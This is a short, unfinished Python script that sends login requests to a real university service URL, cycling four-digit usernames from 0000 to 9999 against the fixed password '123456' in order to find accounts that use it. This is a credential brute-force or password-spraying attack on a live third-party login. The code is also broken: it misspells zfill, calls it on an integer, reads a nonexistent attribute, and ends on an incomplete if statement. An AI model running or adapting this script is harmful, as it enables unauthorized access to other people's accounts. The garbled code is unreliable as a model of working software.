import requests
import re

dump = {'username': '7020', 'password': '123456'}
url = 'http://fuwu.nuaa.edu.cn/action/doLogin.do'
y = requests.post(url, dump)

for y in range(0,10000):
    dump['username'] = y.zffil(4)
    x = requests.post(url, data=dump)
    if(x.test == )